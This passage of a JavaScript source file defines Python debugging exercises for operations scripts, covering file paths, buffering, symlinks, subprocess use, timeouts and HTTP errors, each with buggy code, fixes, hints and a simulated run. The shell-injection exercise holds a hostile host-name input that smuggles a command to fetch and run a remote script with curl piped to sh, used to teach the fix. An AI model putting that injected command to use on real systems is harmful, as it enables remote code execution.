      fix: [["import shutil\n", "import shutil\nfrom pathlib import Path\n"], ["open(\"config.json\", encoding=\"utf-8\")", "open(Path(__file__).resolve().parent / \"config.json\", encoding=\"utf-8\")"]],
      wrong: [
        [["open(\"config.json\"", "open(os.path.abspath(\"config.json\")"], ["import json\n", "import json\nimport os\n"]],
        [["open(\"config.json\"", "open(\"./config.json\""]]
      ],
      hints: [
        "A relative path like \"config.json\" is relative to the current working directory, not to the script. Cron starts in your home directory.",
        "`os.path.abspath` still starts from the working directory. `__file__` is the path of the script itself.",
        "Build the path from the script's folder: `Path(__file__).resolve().parent / \"config.json\"` (import Path from pathlib)."
      ],
      lesson: "Relative paths follow the working directory, which cron, systemd and CI all choose for you. Anchor files that ship with a script to __file__.",
      real: ["mkdir -p diskwatch && echo '{\"mounts\": [\"/\"]}' > diskwatch/config.json", "cd ~ && python3 \"$OLDPWD/diskwatch/diskwatch.py\""],
      sim(py) {
        const n = py.line(/open\(/);
        if (!n || !py.has(/disk_usage/)) return gone("it no longer opens the config and checks the mounts");
        const arg = py.call("open").pos[0] || "";
        const viaFile = /__file__/.test(arg) || (py.has(/__file__/) && /^\w+(\s*\/\s*["']config\.json["'])?$|os\.path\.join\(/.test(arg.trim()));
        const lit = (/^["']([^"']+)["']$/.exec(arg.trim()) || [])[1];
        const abs = /abspath\(\s*["']([^"']+)["']/.exec(arg);
        const good = lines("/: 41% used", "/var: 88% used", "/srv: 63% used");
        if (viaFile || (lit && lit === "/home/ops/diskwatch/config.json")) return { out: good, exit: 0, ok: [true, true] };
        const shown = abs ? `/home/ops/${abs[1].replace(/^\.\//, "")}` : lit || "config.json";
        return { out: traceback(py, "diskwatch/diskwatch.py", n, null, `FileNotFoundError: [Errno 2] No such file or directory: '${shown}'`), exit: 1, ok: [false, false] };
      }
    });

    S.push({
      id: "flush", group: "Files and paths", level: "03", title: "The empty report",
      file: "disk_report.py", cmd: "python3 disk_report.py && zcat disk_report.csv.gz",
      story: "The weekly disk report arrives by email every Monday as an empty attachment. The script says it wrote the file, and it did: before the rows reached the disk.",
      goal: "Make the compressed report contain the header and every row.",
      checks: ["The compressed report contains every row"],
      code: src`
import csv
import subprocess

rows = [("web-01", 41), ("web-02", 88), ("db-01", 63)]

out = open("disk_report.csv", "w", newline="")
writer = csv.writer(out)
writer.writerow(["host", "percent_used"])
writer.writerows(rows)
subprocess.run(["gzip", "-f", "disk_report.csv"], check=True)
print("wrote disk_report.csv.gz")
`,
      fix: [["out = open(\"disk_report.csv\", \"w\", newline=\"\")\nwriter = csv.writer(out)\nwriter.writerow([\"host\", \"percent_used\"])\nwriter.writerows(rows)\n",
        "with open(\"disk_report.csv\", \"w\", newline=\"\") as out:\n    writer = csv.writer(out)\n    writer.writerow([\"host\", \"percent_used\"])\n    writer.writerows(rows)\n"]],
      wrong: [
        [["out = open(\"disk_report.csv\", \"w\", newline=\"\")\nwriter = csv.writer(out)\nwriter.writerow([\"host\", \"percent_used\"])\nwriter.writerows(rows)\nsubprocess.run([\"gzip\", \"-f\", \"disk_report.csv\"], check=True)\n",
          "with open(\"disk_report.csv\", \"w\", newline=\"\") as out:\n    writer = csv.writer(out)\n    writer.writerow([\"host\", \"percent_used\"])\n    writer.writerows(rows)\n    subprocess.run([\"gzip\", \"-f\", \"disk_report.csv\"], check=True)\n"]]
      ],
      hints: [
        "Python buffers writes in memory and sends them to the file in blocks. When does this file get closed?",
        "gzip runs while the file is still open, so it reads what has reached the disk so far: nothing.",
        "Write in a `with open(...) as out:` block and call gzip after the block, when the file is closed and flushed."
      ],
      lesson: "Open files with `with` and hand them to other programs only after the block ends: closing flushes Python's buffer to the disk.",
      real: ["python3 disk_report.py && zcat disk_report.csv.gz"],
      sim(py) {
        const g = py.line(/subprocess\.\w+\(\s*\[\s*["']gzip/);
        const w = py.line(/writerows\(/);
        if (!g || !w) return gone("it no longer writes the rows and compresses the file");
        const inWith = (n) => py.inside(n, /^with\s+open\(/);
        const block = inWith(w);
        const handle = (/^\s*(\w+)\s*=\s*open\(/m.exec(py.text) || [])[1];
        const closed = block ? !inWith(g) || inWith(g).line !== block.line : Boolean(handle) && py.lines(new RegExp(`${handle}\\.(close|flush)\\(\\)`)).some((l) => l < g && l > w);
        const rows = closed && g > w;
        const said = py.has(/print\(/) ? lines("wrote disk_report.csv.gz") : [];
        return { out: [...said, dim("---- zcat disk_report.csv.gz"), ...(rows ? lines("host,percent_used", "web-01,41", "web-02,88", "db-01,63") : [dim("(no output: the file was empty when gzip read it)")])], exit: 0, ok: [rows] };
      }
    });

    S.push({
      id: "symlinks", group: "Files and paths", level: "03", title: "Too many levels of symbolic links",
      file: "share_size.py", cmd: "python3 share_size.py",
      story: "The capacity report for the shared drive crashes. Someone added /srv/shared/projects/current, a symlink to its own parent, so the newest project is easy to find.",
      goal: "Total the shared drive without following symlinks into a loop.",
      checks: ["No traceback", "Prints the total size"],
      code: src`
import os


def total_size(path):
    size = 0
    for entry in os.scandir(path):
        if entry.is_dir():
            size += total_size(entry.path)
        else:
            size += entry.stat().st_size
    return size


print(f"{total_size('/srv/shared') / 1e9:.1f} GB")
`,
      fix: [["entry.is_dir()", "entry.is_dir(follow_symlinks=False)"], ["entry.stat().st_size", "entry.stat(follow_symlinks=False).st_size"]],
      wrong: [
        [["import os\n", "import os\nimport sys\n\nsys.setrecursionlimit(100000)\n"]],
        [["            size += total_size(entry.path)\n", "            try:\n                size += total_size(entry.path)\n            except RecursionError:\n                pass\n"]]
      ],
      hints: [
        "Read the path in the error: current/current/current... Each step follows the symlink back to the same folder.",
        "`DirEntry.is_dir()` follows symlinks unless you tell it not to. The loop ends when the kernel refuses after 40 levels.",
        "Pass `follow_symlinks=False` to `entry.is_dir()` (and to `entry.stat()`), or use `os.walk`, which does not follow links by default."
      ],
      lesson: "Tree walks must decide what to do with symlinks. os.walk and is_dir(follow_symlinks=False) do not follow them, so loops and links to other disks are not counted twice.",
      real: ["mkdir -p shared/projects && ln -s ../projects shared/projects/current", "sed -i 's#/srv/shared#shared#' share_size.py && python3 share_size.py"],
      sim(py) {
        const walk = py.has(/os\.walk\(/) && !/followlinks\s*=\s*True/.test(py.text);
        const d = py.line(/\.is_dir\(/);
        if (!walk && !d) return gone("it no longer walks the directory tree");
        if (walk || /follow_symlinks\s*=\s*False/.test(py.code[d - 1])) return { out: lines("412.7 GB"), exit: 0, ok: [true, py.has(/print\(/)] };
        const rec = py.line(/total_size\(\s*entry\.path/);
        const top = py.line(/total_size\(\s*['"]\/srv/);
        const h = py.catches(d, ["OSError"]);
        if (h) return { out: lines(...(reports(h.body) ? [err("skipping a symlink loop")] : []), "412.7 GB"), exit: 0, ok: [true, true] };
        const user = (n, fn) => [[`  File "${HOME}/share_size.py", line ${n}, in ${fn}`, "err"], [`    ${py.src(n)}`, "err"]];
        return { out: [err("Traceback (most recent call last):"), ...user(top, "<module>"), ...(rec ? [...user(rec, "total_size"), ...user(rec, "total_size"), err("  [Previous line repeated 38 more times]")] : []), ...user(d, "total_size"),
          err("OSError: [Errno 40] Too many levels of symbolic links: '/srv/shared/projects/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current/current'")], exit: 1, ok: [false, false] };
      }
    });

    // --- Processes and subprocess -----------------------------------------------------

    // A subprocess call: is it a list or a string, through a shell, checked, with a timeout?
    const proc = (c) => {
      const a = (c.pos[0] || c.kw.args || "").trim();
      return { list: /^\[/.test(a), str: /^[fr]?["']|^\w+\s*\+|\.format\(/.test(a) && !/^shlex\.split/.test(a), split: /^shlex\.split/.test(a), arg: a,
        shell: /^True$/.test(c.kw.shell || ""), check: /^True$/.test(c.kw.check || "") || /check_(call|output)$/.test(c.name), timeout: c.kw.timeout && !/^None$/.test(c.kw.timeout) };
    };
    const SUBPROCESS = "subprocess\\.(run|call|check_call|check_output|Popen)";

    S.push({
      id: "shellinj", group: "Processes and subprocess", level: "04", title: "Shell injection",
      file: "ping_bot.py", cmd: "python3 ping_bot.py web-01 && python3 ping_bot.py \"web-01; curl -s http://203.0.113.9/x.sh | sh\"",
      story: "The chat bot lets anyone in the ops channel ask whether a host is up. A penetration tester typed a host name with a semicolon in it, and the bot ran their script on the jump host.",
      goal: "Ping exactly the host that was typed, and never run anything else it contains.",
      checks: ["web-01 is reported up", "Text after the ; is never run"],
      code: src`
import subprocess
import sys


def ping(host):
    result = subprocess.run(f"ping -c 1 -W 2 {host}", shell=True, capture_output=True, text=True)
    return result.returncode == 0


if __name__ == "__main__":
    host = sys.argv[1]
    print(f"{host}: {'up' if ping(host) else 'down'}")
`,
      fix: [["subprocess.run(f\"ping -c 1 -W 2 {host}\", shell=True, capture_output=True, text=True)", "subprocess.run([\"ping\", \"-c\", \"1\", \"-W\", \"2\", host], capture_output=True, text=True)"]],
      wrong: [
        [[", shell=True", ""]],
        [["f\"ping -c 1 -W 2 {host}\"", "[\"ping\", \"-c\", \"1\", \"-W\", \"2\", host]"]]
      ],
      hints: [
        "With `shell=True` the string goes to /bin/sh, and the shell treats `;` as \"then run this next command\".",
        "Removing `shell=True` alone makes Python look for a program literally called \"ping -c 1 -W 2 web-01\". Pass the program and its arguments separately.",
        "Use a list and no shell: `subprocess.run([\"ping\", \"-c\", \"1\", \"-W\", \"2\", host], capture_output=True, text=True)`."
      ],
      lesson: "Pass subprocess a list of arguments and leave shell=True out. Each element reaches the program as one argument, so ; | $( ) in input stay plain text.",
      real: ["python3 ping_bot.py 127.0.0.1", "python3 ping_bot.py '127.0.0.1; echo INJECTED'   # prints INJECTED only with shell=True"],
      sim(py) {
        const c = py.call(SUBPROCESS);
        if (!c || !/ping/.test(c.args)) return gone("it no longer runs ping");
        const p = proc(c);
        const bad = "web-01; curl -s http://203.0.113.9/x.sh | sh";
        const said = (h, up) => [`${h}: ${up ? "up" : "down"}`, ""];
        if (p.shell && p.list) return { out: [said("web-01", false), said(bad, false)], exit: 0, ok: [false, true] };
        if (p.shell && !/shlex\.quote\(/.test(p.arg)) return { out: [said("web-01", true), dim("(the shell also ran: curl -s http://203.0.113.9/x.sh | sh)"), said(bad, true)], exit: 0, ok: [true, false] };
        if (p.shell) return { out: [said("web-01", true), said(bad, false)], exit: 0, ok: [true, true] };
        if (p.str) {
          const shown = H.say({ pos: [p.arg] }, { host: "web-01" });
          return { out: traceback(py, "ping_bot.py", c.line, [lib("subprocess.py", 555, "run", "with Popen(*popenargs, **kwargs) as process:"), lib("subprocess.py", 1040, "__init__", "self._execute_child(args, executable, preexec_fn, close_fds,"), lib("subprocess.py", 1992, "_execute_child", "raise child_exception_type(errno_num, err_msg, err_filename)")], `FileNotFoundError: [Errno 2] No such file or directory: '${shown}'`), exit: 1, ok: [false, true] };
        }
        return { out: [said("web-01", true), said(bad, false)], exit: 0, ok: [true, true] };
      }
    });

    S.push({
      id: "checktrue", group: "Processes and subprocess", level: "04", title: "Backup complete (it was not)",
      file: "backup_db.py", cmd: "python3 backup_db.py",
      story: "The database password was rotated on Friday. Every nightly backup since has printed \"Backup complete\" and exited 0. Nobody noticed until a restore was needed.",
      goal: "Stop at the first failing command and exit non-zero, so cron and monitoring see the failure.",
      checks: ["Stops when pg_dump fails", "Exits non-zero"],
      code: src`
import subprocess
from datetime import date

dump = f"/backups/shop-{date.today()}.dump"
subprocess.run(["pg_dump", "--format=custom", "--file", dump, "shop"])
subprocess.run(["aws", "s3", "cp", dump, "s3://shop-backups/"])
print("Backup complete")
`,
      fix: [["\"--file\", dump, \"shop\"])", "\"--file\", dump, \"shop\"], check=True)"], ["\"s3://shop-backups/\"])", "\"s3://shop-backups/\"], check=True)"]],
      wrong: [
        [["\"--file\", dump, \"shop\"])", "\"--file\", dump, \"shop\"], capture_output=True)"]],
        [["\"s3://shop-backups/\"])", "\"s3://shop-backups/\"], check=True)"]]
      ],
      hints: [
        "pg_dump printed an error, and the script carried on. What does `subprocess.run` do with a command's exit status?",
        "`subprocess.run` returns a CompletedProcess and raises nothing, whatever the exit status, unless you ask it to.",
        "Add `check=True` to both calls. A failure then raises CalledProcessError, the script stops, and Python exits with status 1."
      ],
      lesson: "subprocess.run ignores exit statuses unless you pass check=True (or test returncode yourself). Unchecked commands turn failures into silent successes.",
      real: ["python3 -c \"import subprocess; subprocess.run(['false']); print('carried on')\"", "python3 -c \"import subprocess; subprocess.run(['false'], check=True)\"; echo \"exit $?\""],
      sim(py) {
        const all = py.calls(SUBPROCESS);
        const pg = all.find((c) => /pg_dump/.test(c.args)), s3 = all.find((c) => /["']s3["']/.test(c.args));
        if (!pg || !s3) return gone("it no longer runs pg_dump and the upload");
        const dump = "/backups/shop-2026-10-30.dump";
        const pgErr = err('pg_dump: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: FATAL:  password authentication failed for user "backup"');
        const guarded = (c) => {
          const v = (/^\s*(\w+)\s*=/.exec(py.code[c.line - 1]) || [])[1];
          if (!v) return false;
          const g = py.lines(new RegExp(`if\\s+(${v}\\.returncode|not\\s+${v}\\.returncode\\s*==\\s*0)`)).find((l) => l > c.line && /sys\.exit|raise|exit\(/.test(py.bodyText(l)));
          return Boolean(g) || py.has(new RegExp(`${v}\\.check_returncode\\(\\)`));
        };
        const stop = (c, cmd, code) => traceback(py, "backup_db.py", c.line, [lib("subprocess.py", 578, "run", "raise CalledProcessError(retcode, process.args,\n                         output=stdout, stderr=stderr)")], `subprocess.CalledProcessError: Command '${cmd}' returned non-zero exit status ${code}.`);
        const pgOut = proc(pg).check ? [] : [];
        const hidden = /capture_output\s*=\s*True|stderr\s*=/.test(pg.args);
        const first = hidden ? [] : [pgErr];
        if (proc(pg).check) return { out: [...first, ...pgOut, ...stop(pg, `['pg_dump', '--format=custom', '--file', '${dump}', 'shop']`, 1)], exit: 1, ok: [true, true] };
        if (guarded(pg)) return { out: [...first, err("pg_dump failed")], exit: 1, ok: [true, true] };
        const s3Err = err(`The user-provided path ${dump} does not exist.`);
        if (proc(s3).check) return { out: [...first, s3Err, ...stop(s3, `['aws', 's3', 'cp', '${dump}', 's3://shop-backups/']`, 255)], exit: 1, ok: [false, true] };
        return { out: [...first, s3Err, ...(py.has(/print\(\s*["']Backup complete/) ? lines("Backup complete") : [])], exit: 0, ok: [false, false] };
      }
    });

    S.push({
      id: "hang", group: "Processes and subprocess", level: "04", title: "One host hangs the whole run",
      file: "fleet_df.py", cmd: "python3 fleet_df.py",
      story: "The morning disk report never arrived. nfs-01 has a stuck NFS mount: ssh connects fine, but df on that host waits for the mount for ever, and so does the script.",
      goal: "Give each host 30 seconds, report the one that does not answer, and still check the rest.",
      checks: ["The run finishes", "nfs-01 is reported and db-01 is still checked"],
      code: src`
import subprocess

HOSTS = ["web-01", "web-02", "nfs-01", "db-01"]

for host in HOSTS:
    result = subprocess.run(["ssh", host, "df", "-h", "/"], capture_output=True, text=True)
    print(f"--- {host}\n{result.stdout}")
`,
      fix: [["    result = subprocess.run([\"ssh\", host, \"df\", \"-h\", \"/\"], capture_output=True, text=True)\n",
        "    try:\n        result = subprocess.run([\"ssh\", host, \"df\", \"-h\", \"/\"], capture_output=True, text=True, timeout=30)\n    except subprocess.TimeoutExpired:\n        print(f\"--- {host}: no answer in 30 seconds\")\n        continue\n"]],
      wrong: [
        [["[\"ssh\", host,", "[\"ssh\", \"-o\", \"ConnectTimeout=5\", host,"]],
        [["text=True)", "text=True, timeout=30)"]],
        [["    result = subprocess.run([\"ssh\", host, \"df\", \"-h\", \"/\"], capture_output=True, text=True)\n",
          "    try:\n        result = subprocess.run([\"ssh\", host, \"df\", \"-h\", \"/\"], capture_output=True, text=True)\n    except subprocess.TimeoutExpired:\n        continue\n"]]
      ],
      hints: [
        "The connection works; the command at the other end never finishes. What limits how long `subprocess.run` waits?",
        "`timeout=` makes `subprocess.run` kill the command and raise `subprocess.TimeoutExpired`. ssh's ConnectTimeout only covers connecting.",
        "Add `timeout=30`, wrap the call in `try:` / `except subprocess.TimeoutExpired:`, print which host timed out, and `continue`."
      ],
      lesson: "Anything that waits on another machine needs a timeout, and the timeout needs a handler that reports and moves on. One stuck host should cost 30 seconds, not the whole run.",
      real: ["python3 -c \"import subprocess; subprocess.run(['sleep', '60'], timeout=2)\""],
      sim(py) {
        const c = py.calls(SUBPROCESS).find((x) => /ssh/.test(x.args));
        if (!c || !py.line(/^\s*for\s+\w+\s+in\s+HOSTS/)) return gone("it no longer runs ssh for each host");
        const df = (h, use) => lines(`--- ${h}`, "Filesystem      Size  Used Avail Use% Mounted on", `/dev/sda1        40G   ${use}G   ${40 - use - 2}G  ${Math.round(use * 100 / 40)}% /`, "");
        const before = [...df("web-01", 17), ...df("web-02", 31)];
        if (!proc(c).timeout) {
          return { out: [...before, dim("(no output for 6 hours; three later cron runs are queued behind it)"), ["^C", ""],
            ...traceback(py, "fleet_df.py", c.line, [lib("subprocess.py", 557, "run", "stdout, stderr = process.communicate(input, timeout=timeout)"), lib("subprocess.py", 1223, "communicate", "stdout, stderr = self._communicate(input, endtime, timeout)"),
              lib("subprocess.py", 2155, "_communicate", "ready = selector.select(timeout)"), lib("selectors.py", 398, "select", "fd_event_list = self._selector.poll(timeout)")], "KeyboardInterrupt")], exit: 130, ok: [false, false] };
        }
        const h = py.catches(c.line, ["TimeoutExpired", "SubprocessError"]);
        if (!h) return { out: [...before, ...traceback(py, "fleet_df.py", c.line, [lib("subprocess.py", 557, "run", "stdout, stderr = process.communicate(input, timeout=timeout)"), lib("subprocess.py", 2078, "_wait", "raise TimeoutExpired(self.args, timeout)")], `subprocess.TimeoutExpired: Command '['ssh', 'nfs-01', 'df', '-h', '/']' timed out after ${c.kw.timeout} seconds`)], exit: 1, ok: [true, false] };
        const said = reports(h.body);
        const loopOn = /\bcontinue\b/.test(h.body) || py.inside(h.line, /^for\b/);
        return { out: [...before, ...(said ? lines("--- nfs-01: no answer in 30 seconds") : []), ...(loopOn ? df("db-01", 22) : [])], exit: 0, ok: [true, said && Boolean(loopOn)] };
      }
    });

    S.push({
      id: "bytes", group: "Processes and subprocess", level: "04", title: "The alert that never fires",
      file: "disk_full.py", cmd: "python3 disk_full.py",
      story: "/var/log filled up overnight and the app stopped writing. The disk check ran every five minutes and said nothing. It has never alerted, on any server.",
      goal: "Alert for every mount at 100%, naming the mount point as plain text. /var/log is full.",
      checks: ["Alerts for /var/log", "Prints the mount point as text"],
      code: src`
import subprocess

out = subprocess.run(["df", "-P"], capture_output=True).stdout
for line in out.splitlines()[1:]:
    fields = line.split()
    if fields[4] == "100%":
        print(f"FULL: {fields[5]}")
print("disk check done")
`,
      fix: [["capture_output=True)", "capture_output=True, text=True)"]],
      wrong: [
        [["out = subprocess.run([\"df\", \"-P\"], capture_output=True).stdout", "out = str(subprocess.run([\"df\", \"-P\"], capture_output=True).stdout)"]],
        [["fields[4] == \"100%\"", "fields[4] == b\"100%\""]]
      ],
      hints: [
        "No error, no alert. Print `repr(fields[4])` in your head: is it `'100%'`?",
        "Without `text=True`, `subprocess.run` returns bytes. `b'100%' == '100%'` is simply False in Python 3.",
        "Pass `text=True` so stdout is a str (decoded with the locale's encoding)."
      ],
      lesson: "subprocess gives you bytes unless you pass text=True (or encoding=). Bytes never equal str, so comparisons fail silently instead of raising.",
      real: ["python3 -c \"import subprocess; print(repr(subprocess.run(['df', '-P'], capture_output=True).stdout[:40]))\""],
      sim(py) {
        const c = py.calls(SUBPROCESS).find((x) => /["']df["']/.test(x.args));
        if (!c || !py.line(/fields\s*\[\s*4\s*\]/)) return gone("it no longer reads df's output");
        const text = /text\s*=\s*True|universal_newlines\s*=\s*True|encoding\s*=/.test(c.args) || py.has(/\.decode\(/);
        const wrapped = py.has(/str\(\s*subprocess\.run/);
        const bcmp = /==\s*(b["']100%["']|["']100%["']\.encode\(\))/.test(at(py, /fields\s*\[\s*4\s*\]/));
        const done = lines("disk check done");
        if (wrapped) return { out: done, exit: 0, ok: [false, false] };
        if (text) return { out: bcmp ? done : [["FULL: /var/log", ""], ...done], exit: 0, ok: [!bcmp, !bcmp] };
        if (bcmp) return { out: [["FULL: b'/var/log'", ""], ...done], exit: 0, ok: [true, false] };
        return { out: done, exit: 0, ok: [false, false] };
      }
    });

    S.push({
      id: "cronpath", group: "Processes and subprocess", level: "04", title: "No such file: 'kubectl'",
      file: "failed_pods.py", cmd: "env -i PATH=/usr/bin:/bin python3 failed_pods.py   # cron's environment",
      story: "The failed-Pod report runs perfectly in your terminal. From cron it has failed every hour since it was installed, because cron's PATH is only /usr/bin:/bin and kubectl lives in /usr/local/bin.",
      goal: "Find kubectl when run from cron, and list the failed Pods.",
      checks: ["Finds kubectl under cron's PATH", "Lists the failed Pods"],
      code: src`
import subprocess

pods = subprocess.run(["kubectl", "get", "pods", "-A", "--field-selector=status.phase=Failed", "-o", "name"],
                      capture_output=True, text=True, check=True)
for pod in pods.stdout.split():
    print("failed:", pod)
`,
      fix: [["[\"kubectl\", \"get\"", "[\"/usr/local/bin/kubectl\", \"get\""]],
      wrong: [
        [["import subprocess\n", "import shutil\nimport subprocess\n"], ["[\"kubectl\", \"get\"", "[shutil.which(\"kubectl\"), \"get\""]],
        [["[\"kubectl\", \"get\", \"pods\", \"-A\", \"--field-selector=status.phase=Failed\", \"-o\", \"name\"],\n                      capture_output=True,", "\"kubectl get pods -A --field-selector=status.phase=Failed -o name\",\n                      shell=True, capture_output=True,"]]
      ],
      hints: [
        "Run it the way cron does (the command above). The program name is looked up in PATH, and cron's PATH is short.",
        "`shutil.which(\"kubectl\")` searches the same short PATH and returns None. A shell finds nothing more either.",
        "Give the full path, `\"/usr/local/bin/kubectl\"`, or set PATH explicitly in the crontab or in `env=`."
      ],
      lesson: "Cron, systemd and CI start programs with a minimal PATH. Use absolute paths to tools in scheduled scripts, or set PATH explicitly where the job is defined.",
      real: ["env -i PATH=/usr/bin:/bin python3 -c \"import shutil; print(shutil.which('kubectl'))\""],
      sim(py) {
        const c = py.calls(SUBPROCESS).find((x) => /kubectl/.test(x.args));
        if (!c) return gone("it no longer runs kubectl");
        const p = proc(c);
        const pathFixed = py.has(/os\.environ\[\s*["']PATH["']\s*\]\s*(\+?=)[^\n]*\/usr\/local\/bin|env\s*=\s*\{[^}]*PATH[^}]*\/usr\/local\/bin|which\(\s*["']kubectl["']\s*,\s*path\s*=[^)]*\/usr\/local\/bin/);
        const abs = /["']\/usr\/local\/bin\/kubectl["']/.test(p.arg);
        const listed = lines("failed: pod/report-28817460-x7k2p", "failed: pod/migrate-shop-9qk4d");
        if (abs || pathFixed) return { out: py.has(/print\(/) ? listed : [], exit: 0, ok: [true, true] };
        if (/which\(/.test(p.arg) || py.has(/=\s*shutil\.which\(\s*["']kubectl["']\s*\)/)) {
          return { out: traceback(py, "failed_pods.py", c.line, [lib("subprocess.py", 555, "run", "with Popen(*popenargs, **kwargs) as process:"), lib("subprocess.py", 1821, "_posix_spawn", "self.pid = os.posix_spawn(executable, args, env, **kwargs)")], "TypeError: expected str, bytes or os.PathLike object, not NoneType"), exit: 1, ok: [false, false] };
        }
        if (p.shell) {
          return { out: [err("/bin/sh: 1: kubectl: not found"), ...(p.check ? traceback(py, "failed_pods.py", c.line, [lib("subprocess.py", 578, "run", "raise CalledProcessError(retcode, process.args,\n                         output=stdout, stderr=stderr)")], "subprocess.CalledProcessError: Command 'kubectl get pods -A --field-selector=status.phase=Failed -o name' returned non-zero exit status 127.") : [])], exit: p.check ? 1 : 0, ok: [false, false] };
        }
        return { out: traceback(py, "failed_pods.py", c.line, [lib("subprocess.py", 555, "run", "with Popen(*popenargs, **kwargs) as process:"), lib("subprocess.py", 1040, "__init__", "self._execute_child(args, executable, preexec_fn, close_fds,"), lib("subprocess.py", 1992, "_execute_child", "raise child_exception_type(errno_num, err_msg, err_filename)")], "FileNotFoundError: [Errno 2] No such file or directory: 'kubectl'"), exit: 1, ok: [false, false] };
      }
    });

    // --- HTTP and APIs ------------------------------------------------------------------

    const REQ = (verb) => [vlib("requests/api.py", 87, verb, `return request("${verb}", url, params=params, **kwargs)`), vlib("requests/api.py", 71, "request", "return session.request(method=method, url=url, **kwargs)"),
      vlib("requests/sessions.py", 651, "request", "resp = self.send(prep, **send_kwargs)"), vlib("requests/sessions.py", 784, "send", "r = adapter.send(request, **kwargs)")];
    const CHAINED = [dim("(two chained tracebacks, from the socket and from urllib3, are printed first; only the last is shown here)"), ["", ""]];
    const hasTimeout = (c) => Boolean(c && c.kw.timeout && !/^(None|0|0\.0)$/.test(c.kw.timeout));

    S.push({
      id: "timeout", group: "HTTP and APIs", level: "07", title: "Hangs for ever",
      file: "status_check.py", cmd: "python3 status_check.py",
      story: "The status API accepted the connection and then stopped answering. The health check that should have paged someone sat waiting all night, and so did the six copies cron started after it.",
      goal: "Finish within a minute whatever the API does, and report it as DOWN with exit status 2.",
      checks: ["Finishes within a minute", "Reports DOWN and exits 2"],
      code: src`
import sys

import requests

STATUS_URL = "http://status.internal:8080/api/health"

resp = requests.get(STATUS_URL)
if resp.status_code == 200:
    print("status API: UP")
    sys.exit(0)
print(f"status API: DOWN ({resp.status_code})")
sys.exit(2)
`,
      fix: [["resp = requests.get(STATUS_URL)\n", "try:\n    resp = requests.get(STATUS_URL, timeout=10)\nexcept requests.exceptions.RequestException as e:\n    print(f\"status API: DOWN ({e})\")\n    sys.exit(2)\n"]],
      wrong: [
        [["requests.get(STATUS_URL)", "requests.get(STATUS_URL, timeout=None)"]],
        [["resp = requests.get(STATUS_URL)\n", "try:\n    resp = requests.get(STATUS_URL)\nexcept requests.exceptions.RequestException as e:\n    print(f\"status API: DOWN ({e})\")\n    sys.exit(2)\n"]],
        [["requests.get(STATUS_URL)", "requests.get(STATUS_URL, timeout=10)"]]
      ],
      hints: [
        "requests waits for an answer for as long as it takes, unless you give it a limit.",
        "`timeout=10` makes requests raise `requests.exceptions.ReadTimeout` (a `RequestException`) instead of waiting for ever. Then handle it.",
        "Call `requests.get(STATUS_URL, timeout=10)` inside `try:`, and in `except requests.exceptions.RequestException as e:` print DOWN and `sys.exit(2)`."
      ],
      lesson: "Every network call needs a timeout, and a timeout is an error you must handle. Without one, a server that stops answering stops your script too.",
      real: ["python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', 8081)); s.listen(); c = s.accept(); time.sleep(3600)\" &",
        "sed -i 's#http://status.internal:8080#http://127.0.0.1:8081#' status_check.py && python3 status_check.py"],
      sim(py) {
        const c = py.call("requests\\.get");
        if (!c) return gone("it no longer calls the status API");
        const msg = "HTTPConnectionPool(host='status.internal', port=8080): Read timed out. (read timeout=" + (c.kw.timeout || "") + ")";
        if (!hasTimeout(c)) {
          return { out: [dim("(no output; still waiting after 8 hours)"), ["^C", ""], ...traceback(py, "status_check.py", c.line, [...REQ("get"), vlib("requests/adapters.py", 696, "send", "resp = conn.urlopen("),
            vlib("urllib3/connectionpool.py", 793, "urlopen", "response = self._make_request("), vlib("urllib3/connectionpool.py", 540, "_make_request", "response = conn.getresponse()"), lib("http/client.py", 1478, "getresponse", "response.begin()"),
            lib("http/client.py", 343, "begin", "version, status, reason = self._read_status()"), lib("http/client.py", 304, "_read_status", "line = str(self.fp.readline(_MAXLINE + 1), \"iso-8859-1\")"),
            lib("socket.py", 723, "readinto", "return self._sock.recv_into(b)")], "KeyboardInterrupt")], exit: 130, ok: [false, false] };
        }
        const h = py.catches(c.line, ["ReadTimeout", "Timeout", "RequestException"]);
        if (!h) return { out: [...CHAINED, ...traceback(py, "status_check.py", c.line, [...REQ("get"), vlib("requests/adapters.py", 742, "send", "raise ReadTimeout(e, request=request)")], `requests.exceptions.ReadTimeout: ${msg}`, ["During handling of the above exception, another exception occurred:", ""])], exit: 1, ok: [true, false] };
        const code = Number((/sys\.exit\(\s*(\d+)/.exec(h.body) || [])[1] || 0);
        const said = reports(h.body);
        return { out: said ? lines(`status API: DOWN (${msg})`) : [], exit: code, ok: [true, said && code === 2] };
      }
    });

    S.push({
      id: "jsonhtml", group: "HTTP and APIs", level: "07", title: "JSONDecodeError on an error page",
      file: "open_incidents.py", cmd: "python3 open_incidents.py",
      story: "During a gateway outage the incident dashboard script failed with \"Expecting value: line 1 column 1\". The API had answered 502 with an HTML error page, and the script tried to read it as JSON.",
      goal: "When the API fails, say which HTTP status it returned. Never report 0 open incidents because the API was down.",
      checks: ["The error names the HTTP status", "Never reports 0 open incidents on failure"],
      code: src`
import requests

API = "https://incidents.internal/api/v2/incidents?status=open"

resp = requests.get(API, timeout=10)
incidents = resp.json()["items"]
print(f"{len(incidents)} open incidents")
for inc in incidents:
    print(f"  {inc['id']}  {inc['title']}")
`,
      fix: [["resp = requests.get(API, timeout=10)\n", "resp = requests.get(API, timeout=10)\nresp.raise_for_status()\n"]],
      wrong: [
        [["incidents = resp.json()[\"items\"]\n", "try:\n    incidents = resp.json()[\"items\"]\nexcept ValueError:\n    incidents = []\n"]],
        [["import requests\n", "import json\n\nimport requests\n"], ["resp.json()[\"items\"]", "json.loads(resp.text)[\"items\"]"]]
      ],
      hints: [
        "\"Expecting value: line 1 column 1 (char 0)\" means the body is not JSON at all. What did the server actually send, and with which status?",
        "requests does not raise on 4xx or 5xx responses. Check the status before you parse the body.",
        "Call `resp.raise_for_status()` straight after `requests.get(...)`: it raises HTTPError naming the status and the URL."
      ],
      lesson: "Check the status before reading the body: raise_for_status() turns a 502 into a clear HTTPError. Treating a failed call as an empty result reports a false all-clear.",
      real: ["python3 -c \"import requests; r = requests.get('https://httpbin.org/status/502', timeout=10); print(r.status_code); r.raise_for_status()\""],
      sim(py) {
        const c = py.call("requests\\.get");
        const parse = py.line(/\.json\(\)|json\.loads\(/);
        if (!c || !parse) return gone("it no longer fetches and parses the incidents");
